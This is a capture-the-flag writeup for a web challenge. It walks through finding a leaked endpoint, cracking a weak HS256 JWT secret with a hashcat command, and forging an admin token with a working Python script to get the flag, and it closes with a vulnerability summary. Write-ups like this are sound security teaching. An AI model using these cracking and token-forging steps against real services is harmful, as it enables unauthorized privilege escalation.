# SIC MUNDUS — CTF Web Challenge Writeup

**Challenge:** SIC MUNDUS  
**Category:** Web  
**Flag:** `CrackOn{4dmin_1s_just_4_cla1m_1n_jwt}`

---

## Challenge Description

> Access to the internal archives is restricted.
> The system verifies every user based on the identity they present.
> But in Winden… identity is not always permanent.
> Sometimes, gaining access is not about breaking the system — but about becoming someone else, and got to correct timeline to find the Knot.

**Given credentials:** `user:user123`  
**URL:** `https://web1.crack-on.live/login`

---

## Recon

### Login Page

Fetching the login page revealed a standard HTML form:

```html
<form method="POST">
  <input type="text" name="username" ...>
  <input type="password" name="password" ...>
  <button type="submit">Enter</button>
  <!-- internal monitoring endpoint: /system/logs -->
</form>
```

**Key finding:** An HTML comment leaked a hidden internal endpoint — `/system/logs`.

---

### Logging In

Attempting login via JSON body (`Content-Type: application/json`) returned `Invalid credentials`.  
Switching to **form-encoded POST** (`application/x-www-form-urlencoded`) with `user:user123` succeeded:

```
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzczNTU1NDEzfQ.LnB9W3bs8gkIVsbnoW1nnrOQdhBTtZbRtUfcgiEJ5gA
```

The application uses a **JWT cookie** (`auth_token`) for authentication.

---

## JWT Analysis

Decoding the token:

**Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload:**
```json
{
  "user": "user",
  "role": "user",
  "exp": 1773555413
}
```

The payload contains a `role` field. The `/system/logs` endpoint returned:

```
403 - Access Restricted
```

The hint "becoming someone else" + a `role` claim in the JWT pointed directly at **JWT privilege escalation**.

---

## Attacks Attempted

### 1. `alg=none` Bypass — ❌ Failed

Crafted unsigned tokens with `"alg": "none"` (and casing variants: `None`, `NONE`, `nOnE`) and `"role": "admin"`. The server properly rejected all unsigned tokens and redirected back to login.

### 2. HTTP Header Injection — ❌ Failed

Tried injecting headers like `X-Role: admin`, `X-User-Role: admin`, `X-Admin: true`, `X-Forwarded-For: 127.0.0.1`, etc. None bypassed the access check.

### 3. JWT `kid` Header Injection — ❌ Failed

Attempted `kid` header manipulations to point to an empty/null key source. Not exploitable on this server.

### 4. Static File & Source Code Recon

- `/static/script.js` — empty
- `/.git/config`, `/app.py`, etc. — 404
- No source code exposed

### 5. JWT Secret Cracking — ✅ SUCCESS

Saved the JWT to a file and ran **hashcat** (mode `16500` — HMAC-SHA256 JWT) in WSL with a custom CTF/Dark-themed wordlist:

```bash
hashcat -m 16500 jwt.txt wordlist.txt --force
```

**Result:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzczNTU1NDEzfQ.LnB9W3bs8gkIVsbnoW1nnrOQdhBTtZbRtUfcgiEJ5gA:password123
```

**JWT Secret: `password123`**

---

## Exploitation

With the secret known, a new JWT was forged with `role: admin`:

```python
import hmac, hashlib, base64, json, time

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

secret = "password123"
header  = {"alg": "HS256", "typ": "JWT"}
payload = {"user": "admin", "role": "admin", "exp": int(time.time()) + 36000}

h = b64url_encode(json.dumps(header,  separators=(',', ':')))
p = b64url_encode(json.dumps(payload, separators=(',', ':')))

signing_input = f"{h}.{p}".encode()
sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()

admin_token = f"{h}.{p}.{b64url_encode(sig)}"
```

Sending the forged token to `/system/logs`:

```
GET /system/logs
Cookie: auth_token=<forged_admin_jwt>
```

**Response:**
```html
<h2 style='color:#d4af37;text-align:center;margin-top:100px'>
  CrackOn{4dmin_1s_just_4_cla1m_1n_jwt}
</h2>
```

---

## Flag

```
CrackOn{4dmin_1s_just_4_cla1m_1n_jwt}
```

---

## Vulnerability Summary

| Vulnerability | Description |
|---|---|
| **Weak JWT Secret** | The server signed JWTs with `password123`, trivially crackable with hashcat |
| **Insecure Role-Based Access Control via JWT** | The `role` claim in the JWT payload was trusted without additional server-side validation, allowing privilege escalation by forging a valid admin token |
| **Information Disclosure** | HTML comment in the login page revealed a sensitive internal endpoint (`/system/logs`) |

---

## Tools Used

| Tool | Purpose |
|---|---|
| Python + `requests` | Recon, login, JWT decoding, exploit |
| hashcat (WSL, mode 16500) | JWT HMAC-SHA256 secret cracking |
| Custom wordlist | Dark/CTF-themed passwords |

---

## Timeline

1. Fetched login page → found `/system/logs` hint in HTML comment  
2. Logged in with `user:user123` (form-encoded) → received JWT cookie  
3. Decoded JWT → identified `role: user` claim  
4. Tested `alg=none`, header injection, `kid` injection → all failed  
5. Cracked JWT secret with hashcat → `password123`  
6. Forged admin JWT → accessed `/system/logs` → **flag obtained**
